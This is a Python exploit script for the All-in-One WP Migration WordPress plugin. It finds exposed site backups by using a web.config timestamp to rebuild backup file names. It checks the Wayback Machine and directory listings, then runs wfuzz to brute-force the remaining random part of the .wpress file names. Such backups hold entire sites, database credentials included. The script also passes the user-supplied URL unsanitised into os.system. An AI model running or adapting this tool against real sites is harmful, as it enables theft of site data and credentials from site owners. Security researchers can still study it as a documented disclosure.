#!/usr/bin/python3
# -*- coding: UTF-8 -*-
#
# All-in-One WP Migration Backup Finder
#
# Based Off @vavkamil's hard work - https://vavkamil.cz/2020/03/25/all-in-one-wp-migration/
#
# Script made by @random_robbie
#
# This script deals with if a wordpress site redirects so that you can ensure you get the right url and no 302s
#
# Requires Wfuzz installed
#
#
#
import requests
import concurrent.futures
from datetime import datetime, timedelta
import argparse
from urllib.parse import urlparse
import sys
import os
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


session = requests.Session()
parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", required=True, help="Wordpress Url")
args = parser.parse_args()
url = args.url


def vercheck (url,headers):
	vercheck = session.get(""+url+"/wp-content/plugins/all-in-one-wp-migration/readme.txt", headers=headers,verify=False)
	if "7.15" in vercheck.text:
		print("This version is not vulnerable sorry")
		sys.exit(0)

def lazycheck(url,headers):
	lazycheck = session.get(""+url+"/wp-content/ai1wm-backups/", headers=headers,verify=False)
	if ".wpress" in lazycheck.text:
		print ("[*] Do not need to bruteforce as the backup folder has directory listings enabled.[*] ")
		print ("[*] Please Browse to "+url+"/wp-content/ai1wm-backups/ to see exposed directory [*] ")
		sys.exit(0)

def wayback(domain,headers):
	wayback = session.get("http://web.archive.org/cdx/search/cdx?url="+url+"*&output=txt&fl=original&collapse=urlkey", headers=headers,verify=False)
	if "wp-content/ai1wm-backups" in wayback.text:
		print ("[*] OOOOOOO Wayback machine has a potenital url to check.")
		for line in wayback.content:
			if ".wpress" in line:
				print (line)




headers = {"User-Agent":"curl/7.64.1","Connection":"close","Accept":"*/*"}
response = session.get(""+url+"/wp-content/ai1wm-backups/web.config", headers=headers,verify=False)




if response.status_code == 200:
	if ".wpress" in response.text:
		last_modified = response.headers['last-modified']
		timestamp = datetime.strptime(last_modified,"%a, %d %b %Y %H:%M:%S %Z")
		time_ymd = timestamp.strftime("%Y%m%d")
		time_hms = timestamp.strftime("%H%M%S")
		r = session.get(""+url+"", headers=headers,verify=False)
		domain = urlparse(r.url).netloc
		print ("Checking Wayback Urls")
		wayback(domain,headers)
		print ("Checking Exposed Backup Dir")
		lazycheck(url,headers)
		print ("Checking Plugin Version")
		vercheck (url,headers)
		print ("[*] Terminate WFuzz if you are not seeing 404 or 200 responses as this means error or rate limited. [*] ")
		os.system("wfuzz -c -z range,01-59 -z range,100-999 -X HEAD --sc 200 "+r.url+"wp-content/ai1wm-backups/"+domain+"-"+time_ymd+"-"+time_hms+"FUZZ-FUZ2Z.wpress")

else:
	print ("[*] Sorry not able to find the file required to start the tests [*] ")
